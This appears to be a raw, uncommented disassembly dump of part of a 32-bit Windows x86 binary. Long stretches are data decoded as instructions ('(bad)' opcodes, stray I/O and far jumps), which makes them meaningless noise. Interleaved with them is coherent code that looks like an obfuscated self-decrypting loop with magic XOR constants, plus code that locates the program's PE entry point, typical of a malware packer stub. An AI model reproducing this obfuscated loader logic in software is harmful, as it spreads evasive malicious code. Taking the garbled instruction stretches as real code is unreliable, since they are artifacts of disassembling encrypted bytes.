  406215:	cs (bad) 
  406217:	or     ecx,edx
  406219:	fs retf 0x113a
  40621d:	add    al,0x43
  40621f:	dec    edi
  406220:	aaa    
  406221:	xchg   edx,eax
  406222:	mov    eax,ds:0x5bed9049
  406227:	sub    al,0x26
  406229:	cmp    eax,0xf5bd5df1
  40622e:	cld    
  40622f:	fisub  WORD PTR [ebp+0x31]
  406232:	jae    0x406270
  406234:	adc    BYTE PTR [ecx],cl
  406236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406237:	(bad)  
  406238:	xchg   ecx,eax
  406239:	fs cmp eax,0xdcb2534d
  40623f:	bound  esp,QWORD PTR [eax]
  406241:	mov    ecx,0x167535c8
  406246:	loopne 0x406291
  406248:	popa   
  406249:	xlat   BYTE PTR ds:[ebx]
  40624a:	sub    al,0xfe
  40624c:	test   BYTE PTR [ecx+0x7148611b],cl
  406252:	ins    DWORD PTR es:[edi],dx
  406253:	pushf  
  406254:	mov    al,0xc5
  406256:	inc    edx
  406257:	xor    DWORD PTR [ebx+0x49],edi
  40625a:	fs add al,0xa8
  40625d:	cdq    
  40625e:	add    BYTE PTR [esi-0xf],0xa7
  406262:	fcmovne st,st(2)
  406264:	int    0x17
  406266:	imul   esi,DWORD PTR [ebp+0x4ed98e4e],0xf
  40626d:	cmp    bh,BYTE PTR [esi-0x19]
  406270:	mov    bh,0x39
  406272:	push   ds
  406273:	out    dx,eax
  406274:	xchg   ecx,eax
  406275:	les    ebx,FWORD PTR [eax-0x3a]
  406278:	jle    0x406286
  40627a:	inc    ecx
  40627b:	daa    
  40627c:	jno    0x406257
  40627e:	inc    edx
  40627f:	leave  
  406280:	stos   DWORD PTR es:[edi],eax
  406281:	out    dx,al
  406282:	xchg   edx,eax
  406283:	repz xlat BYTE PTR ds:[ebx]
  406285:	mov    eax,ds
  406287:	js     0x4062ed
  406289:	imul   ebx,eax,0xffffffea
  40628c:	push   ss
  40628d:	add    al,0x1b
  40628f:	inc    ebp
  406290:	rep repnz ins BYTE PTR es:[edi],dx
  406293:	or     BYTE PTR [ecx-0x72],cl
  406296:	mov    DWORD PTR [edi-0x46],esp
  406299:	inc    esi
  40629a:	xchg   BYTE PTR [ebp-0x32],dh
  40629d:	jbe    0x4062df
  40629f:	shl    DWORD PTR [edx-0x126ea228],cl
  4062a5:	mov    al,ds:0x81bb2abf
  4062aa:	popf   
  4062ab:	dec    ecx
  4062ac:	fild   QWORD PTR [edi]
  4062ae:	sub    eax,0x647a5c1b
  4062b3:	xor    bl,BYTE PTR [esi]
  4062b5:	push   esi
  4062b6:	pop    ecx
  4062b7:	(bad)  
  4062b8:	xor    ebp,DWORD PTR [edx+edx*8+0x54]
  4062bc:	mov    eax,ds:0xe456cfb6
  4062c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4062c2:	push   esi
  4062c3:	fisttp WORD PTR [ecx]
  4062c5:	outs   dx,DWORD PTR ds:[esi]
  4062c6:	aaa    
  4062c7:	test   BYTE PTR [edi],ah
  4062c9:	or     DWORD PTR [ebx],esi
  4062cb:	mov    esp,0x5962ed01
  4062d0:	xchg   BYTE PTR [esi-0x32684db9],ah
  4062d6:	clc    
  4062d7:	ret    0x7bb4
  4062da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4062db:	ins    DWORD PTR es:[edi],dx
  4062dc:	jne    0x4062c9
  4062de:	outs   dx,BYTE PTR ds:[esi]
  4062df:	push   edi
  4062e0:	int    0xf9
  4062e2:	xor    eax,0x66d2f84
  4062e7:	adc    DWORD PTR [esi],esp
  4062e9:	ins    DWORD PTR es:[edi],dx
  4062ea:	jmp    0x406323
  4062ec:	leave  
  4062ed:	xchg   BYTE PTR es:[ecx],bl
  4062f0:	sbb    ecx,DWORD PTR [ecx-0x2d9f2f5]
  4062f6:	aad    0xb9
  4062f8:	or     DWORD PTR [eax-0x4cdae997],esi
  4062fe:	aam    0x7f
  406300:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406301:	je     0x406307
  406303:	cli    
  406304:	add    eax,0xb05a2840
  406309:	dec    ecx
  40630a:	hlt    
  40630b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40630c:	loopne 0x406348
  40630e:	add    DWORD PTR [eax+0x37532663],edx
  406314:	mov    esp,0x5fea1874
  406319:	sbb    al,0x53
  40631b:	add    DWORD PTR [esi+0x72626636],ebp
  406321:	xchg   ecx,eax
  406322:	jmp    0xe2ea:0xe7833419
  406329:	and    BYTE PTR [edi+0x1f],ch
  40632c:	mov    esi,0x98b58397
  406331:	and    ebp,DWORD PTR [ecx-0x62]
  406334:	add    eax,0x4b57669
  406339:	int    0x13
  40633b:	pop    ebx
  40633c:	iret   
  40633d:	jmp    0x977b8b5
  406342:	pop    es
  406343:	outs   dx,DWORD PTR ds:[esi]
  406344:	mov    edi,0xe6d9f76
  406349:	or     ebp,esi
  40634b:	fbstp  TBYTE PTR [edx]
  40634d:	mov    al,0xf9
  40634f:	or     ebp,edx
  406351:	xor    BYTE PTR [esi],ah
  406353:	es test eax,0x90cb2aec
  406359:	(bad)  
  40635a:	fmul   QWORD PTR [edx]
  40635c:	push   cs
  40635d:	scas   al,BYTE PTR es:[edi]
  40635e:	mov    WORD PTR [esi],ss
  406360:	int3   
  406361:	mov    esi,0xebd648ea
  406366:	sub    BYTE PTR [ebx+0x62450c96],ah
  40636c:	lods   eax,DWORD PTR ds:[esi]
  40636d:	jne    0x406319
  40636f:	sbb    al,0xad
  406371:	and    al,0xf9
  406373:	clc    
  406374:	add    ch,BYTE PTR [edi+0x78]
  406377:	imul   BYTE PTR ds:0x37921ba8
  40637d:	sub    eax,0xb8e2263d
  406382:	call   0xafa1:0xbcb5e5a7
  406389:	cmp    esi,DWORD PTR [ecx-0x40]
  40638c:	int3   
  40638d:	std    
  40638e:	pop    ebp
  40638f:	adc    eax,0x44e519c4
  406394:	xchg   DWORD PTR [ecx],eax
  406396:	mov    eax,ds:0x4c0bfe15
  40639b:	popa   
  40639c:	aam    0x24
  40639e:	js     0x40635a
  4063a0:	mov    edx,0xc8f68bbb
  4063a5:	iret   
  4063a6:	xor    eax,0xa9ed4731
  4063ab:	mov    dl,0x7f
  4063ae:	sub    BYTE PTR [esi+0x37],0x89
  4063b2:	jae    0x406384
  4063b4:	cmp    DWORD PTR [eax],0xffffffd6
  4063b7:	cdq    
  4063b8:	push   edi
  4063b9:	in     eax,dx
  4063ba:	adc    al,0x1c
  4063bc:	push   eax
  4063bd:	test   BYTE PTR [esi],0xee
  4063c0:	mov    ds:0x58248839,al
  4063c5:	test   eax,0x7fc772d9
  4063ca:	dec    ecx
  4063cb:	js     0x406392
  4063cd:	and    esp,eax
  4063cf:	btc    DWORD PTR [bp+0xf],ecx
  4063d4:	xchg   BYTE PTR [ebx],al
  4063d6:	add    BYTE PTR [eax],al
  4063d8:	add    BYTE PTR [ebx+0x7d8bc455],cl
  4063de:	cld    
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	dec    eax
  40645f:	(bad)  
  406460:	shl    ebx,1
  406462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406463:	cmp    BYTE PTR [esi+0x7e],bh
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x406437
  40646b:	lods   al,BYTE PTR ds:[esi]
  40646c:	fcomp  DWORD PTR [eax-0xa]
  40646f:	js     0x406403
  406471:	test   al,0x32
  406473:	jae    0x40643a
  406475:	and    eax,0xb317bce
  40647a:	rol    BYTE PTR [edi-0x6c2fff59],1
  406480:	cwde   
  406481:	(bad)  
  406482:	jecxz  0x406434
  406484:	inc    ecx
  406485:	pop    ds
  406486:	and    BYTE PTR [eax+0x59],ah
  406489:	inc    esp
  40648a:	imul   ebp,DWORD PTR [ecx-0x3d],0x4
  40648e:	mov    ds:0x9c0dd5d1,eax
  406493:	das    
  406494:	mov    ebx,0x276f825b
  406499:	jl     0x4064a4
  40649b:	pusha  
  40649c:	mov    bl,0x59
  40649e:	mov    bl,0x9d
  4064a0:	push   ebp
  4064a1:	mov    ch,0xa9
  4064a3:	xchg   edx,eax
  4064a4:	jecxz  0x406430
  4064a6:	rcl    BYTE PTR [edi-0x2c],1
  4064a9:	test   al,0x50
  4064ab:	(bad)  
  4064ac:	sbb    eax,0xc0e1975d
  4064b1:	(bad)  
  4064b2:	sbb    DWORD PTR [edi-0x5afb5823],0xc74d0e0a
  4064bc:	and    eax,0x24ed46f9
  4064c1:	in     eax,0x8e
  4064c3:	xchg   esi,eax
  4064c4:	push   ecx
  4064c5:	enter  0x10eb,0x2e
  4064c9:	or     ebx,DWORD PTR [ecx+0x57]
  4064cc:	and    al,0xb2
  4064ce:	out    0xd5,al
  4064d0:	jne    0x406550
  4064d2:	push   edx
  4064d3:	xor    ch,BYTE PTR [esi+ebp*8-0x1c]
  4064d7:	mov    ebx,0x2afe83f3
  4064dc:	mov    ds:0x97a30130,eax
  4064e1:	sahf   
  4064e2:	push   edi
  4064e3:	mov    al,0x30
  4064e5:	sbb    BYTE PTR [edi+0x6],cl
  4064e8:	test   eax,0x4a31aed8
  4064ed:	dec    edx
  4064ee:	mov    bh,bh
  4064f0:	adc    BYTE PTR [eax-0x6b],al
  4064f3:	jmp    0x4064b9
  4064f5:	sub    BYTE PTR [ebx+edi*8-0x30b1503a],0x55
  4064fd:	repnz cwde 
  4064ff:	ja     0x406487
  406501:	stos   DWORD PTR es:[edi],eax
  406502:	pop    es
  406503:	pushf  
  406504:	jnp    0x40654a
  406506:	ror    DWORD PTR [esp+eax*8+0xdceafb5],cl
  40650d:	adc    ch,BYTE PTR [edx]
  40650f:	cmp    DWORD PTR [ebx],eax
  406511:	xchg   esp,eax
  406512:	popf   
  406513:	inc    ebx
  406514:	popf   
  406515:	sub    eax,0xe7e678c
  40651a:	dec    ebp
  40651b:	stos   DWORD PTR es:[edi],eax
  40651c:	adc    DWORD PTR [esi+0x4e],edi
  40651f:	pop    ebp
  406520:	push   es
  406521:	stos   BYTE PTR es:[edi],al
  406522:	pop    ebx
  406523:	or     dh,BYTE PTR [esi+ebx*8+0x6303ad24]
  40652a:	stos   BYTE PTR es:[edi],al
  40652b:	test   al,0x1d
  40652d:	add    cl,cl
  40652f:	(bad)  
  406530:	(bad)  
  406531:	ds mov esp,edi
  406534:	fisttp WORD PTR [esi-0x42]
  406537:	mov    cs,esp
  406539:	mov    bh,0xfe
  40653b:	(bad)  
  40653d:	adc    eax,0x153fde28
  406542:	fisubr DWORD PTR [edi+0x2b9729a5]
  406548:	jecxz  0x4064fa
  40654a:	les    edi,FWORD PTR ds:0xa42b7cde
  406550:	cmp    dh,bh
  406552:	mov    eax,DWORD PTR [esi-0x6a072d28]
  406558:	mov    ds:0x29572048,al
  40655d:	pop    ebp
  40655e:	(bad)  
  406560:	xor    DWORD PTR [edx-0x75],esi
  406563:	xchg   DWORD PTR [esi],ebx
  406565:	push   edi
  406566:	push   esp
  406567:	dec    esp
  406568:	pop    eax
  406569:	hlt    
  40656a:	fdiv   DWORD PTR [esi+0x27c50d80]
  406570:	add    al,0x6a
  406572:	dec    ebx
  406573:	cs pop ecx
  406575:	out    dx,al
  406576:	xchg   ecx,eax
  406577:	rcr    BYTE PTR [esi],cl
  406579:	mov    bl,0xeb
  40657b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40657c:	mov    cl,0xd0
  40657e:	ins    BYTE PTR es:[edi],dx
  40657f:	and    ecx,DWORD PTR [edi-0x31]
  406582:	push   ebp
  406583:	test   BYTE PTR [eax-0x49],bl
  406586:	mov    eax,ds:0xe0f02a34
  40658b:	jbe    0x406523
  40658d:	das    
  40658e:	inc    eax
  40658f:	cld    
  406590:	scas   al,BYTE PTR es:[edi]
  406591:	out    0x38,eax
  406593:	dec    ecx
  406594:	leave  
  406595:	pop    edx
  406596:	cmp    DWORD PTR [esi+0x16],eax
  406599:	comiss xmm4,xmm6
  40659c:	add    eax,0xe101385a
  4065a1:	sbb    BYTE PTR [esp+eiz*8-0x4f0169a6],bl
  4065a8:	inc    esp
  4065a9:	in     al,0x69
  4065ab:	push   edi
  4065ac:	ins    DWORD PTR es:[edi],dx
  4065ad:	adc    edi,DWORD PTR [esi-0x539bca0c]
  4065b3:	push   ecx
  4065b4:	bound  edx,QWORD PTR [edi-0x7abc0a7b]
  4065ba:	sub    al,BYTE PTR [ecx-0x210db6ff]
  4065c0:	sbb    esp,eax
  4065c2:	xor    al,0xac
  4065c4:	sub    esp,DWORD PTR [ebp+0x4e]
  4065c7:	pushf  
  4065c8:	and    al,BYTE PTR [ecx+0x1b]
  4065cb:	fbstp  TBYTE PTR [edi-0x3fbf7866]
  4065d1:	loope  0x406632
  4065d3:	pop    eax
  4065d4:	jns    0x406629
  4065d6:	mov    ah,0x21
  4065d8:	xchg   edx,eax
  4065d9:	lods   al,BYTE PTR ds:[esi]
  4065da:	xchg   edx,eax
  4065db:	add    DWORD PTR [edx+0x5fadb324],edx
  4065e1:	bound  edi,QWORD PTR [esi+0xa]
  4065e4:	imul   ebp,DWORD PTR [ebx-0x6e],0x7abb0456
  4065eb:	loope  0x406595
  4065ed:	out    dx,eax
  4065ee:	mov    es,WORD PTR [edx-0x7d]
  4065f1:	pushf  
  4065f2:	ret    
  4065f3:	inc    eax
  4065f4:	iret   
  4065f5:	lods   eax,DWORD PTR ds:[esi]
  4065f6:	jmp    0x1955:0xb44fc5d0
  4065fd:	fmul   QWORD PTR [edx]
  4065ff:	add    dh,cl
  406601:	pop    ecx
  406602:	pop    ds
  406603:	cmp    al,0xf6
  406605:	data16 xor bl,ah
  406608:	(bad)  
  406609:	xchg   ecx,eax
  40660a:	fimul  DWORD PTR [esi-0x32]
  40660d:	iret   
  40660e:	ret    0x5d26
  406611:	jb     0x406663
  406613:	mov    BYTE PTR [ecx],ch
  406615:	sbb    al,0xdb
  406617:	rol    eax,0xbc
  40661a:	jno    0x4065fd
  40661c:	or     DWORD PTR [ebp+ecx*1+0x79c0cc81],0x24123138
  406627:	sub    BYTE PTR [ebx+0x36],al
  40662a:	mov    al,ds:0x26f4fd36
  40662f:	mov    bh,0x78
  406631:	out    0xce,al
  406633:	mov    ebp,0x3aaf860c
  406638:	xor    dh,BYTE PTR [ebx+eax*2-0x7d]
  40663c:	mov    BYTE PTR [edi+0x6a],ch
  40663f:	fmul   st(5),st
  406641:	mov    ds:0xa6e568c6,eax
  406646:	jno    0x4065cb
  406648:	je     0x406665
  40664a:	fiadd  DWORD PTR [ebp+eax*1+0x77]
  40664e:	jnp    0x40664d
  406650:	out    0x18,al
  406652:	cmp    eax,ecx
  406654:	test   BYTE PTR [edi],0xa6
  406657:	cli    
  406658:	rcl    DWORD PTR fs:[ecx-0x1c],cl
  40665c:	arpl   ax,bx
  40665e:	(bad)  
  40665f:	inc    ebx
  406660:	cli    
  406661:	(bad)  
  406662:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406663:	rol    DWORD PTR [esp+esi*1-0x70606328],1
  40666a:	mov    al,ds:0x49a8a838
  40666f:	xchg   DWORD PTR [eax+ebx*4],ebp
  406672:	mov    esi,0x68ee02d0
  406677:	cs call 0x1095d351
  40667d:	(bad)  
  40667e:	cmp    ah,BYTE PTR [esi+0x17]
  406681:	dec    esp
  406682:	popf   
  406683:	je     0x40668b
  406685:	jnp    0x4066e2
  406687:	imul   esi,DWORD PTR [esi+0x6cb79791],0xffffff9e
  40668e:	xchg   esi,eax
  40668f:	mov    eax,0x5cb73684
  406694:	mov    ds:0x28021e84,al
  406699:	pop    es
  40669a:	sar    DWORD PTR [esi],0x6b
  40669d:	fs or  al,0x32
  4066a0:	and    eax,0x6bc44fd7
  4066a5:	xlat   BYTE PTR ds:[ebx]
  4066a6:	add    al,0x48
  4066a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066a9:	stos   BYTE PTR es:[edi],al
  4066aa:	aam    0x27
  4066ac:	sub    DWORD PTR [edx],0xffffffe8
  4066af:	pop    eax
  4066b0:	icebp  
  4066b1:	mov    ds:0xd9f01787,al
  4066b6:	or     DWORD PTR [esi+ebp*1],esp
  4066b9:	cdq    
  4066ba:	mov    eax,ds:0xfaa30a9c
  4066bf:	adc    al,0xac
  4066c1:	xor    ah,BYTE PTR [edx]
  4066c3:	mov    cs,WORD PTR [ebx+0x536b49b0]
  4066c9:	jl     0x406723
  4066cb:	jae    0x4066ad
  4066cd:	dec    edi
  4066ce:	das    
  4066cf:	inc    ebx
  4066d0:	push   esp
  4066d1:	dec    ecx
  4066d2:	out    dx,al
  4066d3:	adc    bh,cl
  4066d5:	lods   al,BYTE PTR ds:[esi]
  4066d6:	aam    0xbb
  4066d8:	pop    ds
  4066d9:	shl    dl,1
  4066db:	adc    DWORD PTR ds:0xed317ebc,edx
  4066e1:	lea    esi,[edx+0xb]
  4066e4:	xchg   BYTE PTR [eax],ch
  4066e6:	cwde   
  4066e7:	retf   
  4066e8:	jge    0x406769
  4066ea:	xor    ebx,DWORD PTR [esi]
  4066ec:	bound  ecx,QWORD PTR [ebx]
  4066ee:	outs   dx,BYTE PTR ds:[esi]
  4066ef:	enter  0xcc16,0xed
  4066f3:	cmp    eax,0x989307a5
  4066f8:	or     cl,ch
  4066fa:	scas   eax,DWORD PTR es:[edi]
  4066fb:	mov    dl,0x84
  4066fd:	and    eax,0xf246e762
  406702:	sub    dh,dh
  406704:	popa   
  406705:	aam    0xf6
  406707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406708:	xor    dh,BYTE PTR [esp+eax*4]
  40670b:	outs   dx,DWORD PTR ds:[esi]
  40670c:	(bad)  [esi-0x28]
  40670f:	sbb    eax,0x355450b5
  406714:	and    bh,ah
  406716:	mov    DWORD PTR [ecx],ebx
  406718:	sub    eax,0x1fbcfef8
  40671d:	retf   0x9bd3
  406720:	fsubr  st(0),st
  406722:	push   ds
  406723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406724:	loope  0x4066c0
  406726:	ss lock dec esp
  406729:	not    DWORD PTR [edx-0x75]
  40672c:	cwde   
  40672d:	scas   al,BYTE PTR es:[edi]
  40672e:	push   ecx
  40672f:	or     ecx,ebx
  406731:	cmp    al,0xa1
  406733:	mov    ?,WORD PTR [edx+0x6d]
  406736:	sbb    esp,DWORD PTR [edx]
  406738:	pop    ebx
  406739:	inc    edx
  40673a:	repnz xchg ebx,eax
  40673c:	test   BYTE PTR [ebx-0x5b089d6e],dh
  406742:	mov    bh,0xfd
  406744:	sbb    ecx,DWORD PTR [ebx+0x12]
  406747:	lods   al,BYTE PTR ds:[esi]
  406748:	jmp    0x406710
  40674a:	pop    eax
  40674b:	sub    eax,0x44ea4357
  406750:	sti    
  406751:	ret    
  406752:	push   eax
  406753:	ds jbe 0x4067c4
  406756:	dec    esi
  406757:	outs   dx,DWORD PTR ds:[esi]
  406758:	add    ebx,DWORD PTR gs:[esi+0x41]
  40675c:	int3   
  40675d:	cmp    eax,0xdae9ee7c
  406762:	popa   
  406763:	out    dx,eax
  406764:	nop
  406765:	mov    eax,cs
  406767:	(bad)  
  406768:	jl     0x40673d
  40676a:	jmp    0x4066fb
  40676c:	push   edi
  40676d:	nop
  40676e:	sbb    BYTE PTR [edi],ch
  406770:	out    dx,al
  406771:	xor    DWORD PTR [esi+0x230dd749],ebp
  406777:	retf   0x57b5
  40677a:	add    cl,al
  40677c:	arpl   WORD PTR [eax-0x75762c4c],si
  406782:	mov    eax,ds:0xb6dfc053
  406787:	push   ecx
  406788:	jp     0x4067e0
  40678a:	inc    ebp
  40678b:	adc    dl,BYTE PTR [edi]
  40678d:	ins    DWORD PTR es:[edi],dx
  40678e:	cmp    eax,DWORD PTR [edx]
  406790:	or     al,0x94
  406792:	inc    ebp
  406793:	dec    ebp
  406794:	ins    BYTE PTR es:[edi],dx
  406795:	pop    edi
  406796:	adc    DWORD PTR [eax+0x1f2e9b18],edi
  40679c:	arpl   WORD PTR [edi+0x77a1ae8f],cx
  4067a2:	mov    edi,0x2b402fd2
  4067a7:	xor    edi,eax
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433847
  40686e:	mov    eax,ds:0x43385f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43376b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43376b
  40688f:	inc    eax
  406890:	mov    ds:0x43376b,eax
  406895:	cmp    DWORD PTR ds:0x43376b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43376b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433910
  4068b9:	push   0x433910
  4068be:	push   0x433867
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43376b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43376b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43376b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4337fb,0x433773
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43382f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43371f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4337b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433733,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4337b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4337f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433717,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4337c3,0x433713
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp-0x679b6e39],ecx
  4069de:	adc    bl,al
  4069e0:	aaa    
  4069e1:	data16 (bad) 
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	cmc    
  4069ea:	cmp    ch,BYTE PTR [edx+0x30]
  4069ed:	mov    eax,ds:0x6b0807cf
  4069f2:	shr    DWORD PTR [edx+0x5c13dc77],1
  4069f8:	aad    0xc5
  4069fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069fb:	xchg   ebx,eax
  4069fc:	das    
  4069fd:	in     al,0x68
  4069ff:	fst    DWORD PTR [esi]
  406a01:	mov    esp,0xa7cc9a73
  406a06:	cmp    ebp,DWORD PTR [ecx+0x3d6059af]
  406a0c:	pop    ecx
  406a0d:	shr    BYTE PTR [edx-0x63],1
  406a10:	lock push ebx
  406a12:	inc    eax
  406a13:	out    0x5f,al
  406a15:	pop    es
  406a16:	sbb    bl,BYTE PTR [edx+0x22bdedd9]
  406a1c:	(bad)  
  406a1d:	sub    BYTE PTR [ebp+ebx*4+0x4840bceb],al
  406a24:	adc    ch,ah
  406a26:	retf   0x21b6
  406a29:	jb     0x406a68
  406a2b:	sub    al,BYTE PTR [esi-0x60]
  406a2e:	shr    BYTE PTR [ebx+edx*1+0x189f72da],cl
  406a35:	push   es
  406a36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a37:	pop    ecx
  406a38:	test   BYTE PTR [esi-0x2],dl
  406a3b:	or     DWORD PTR [ecx],0xf
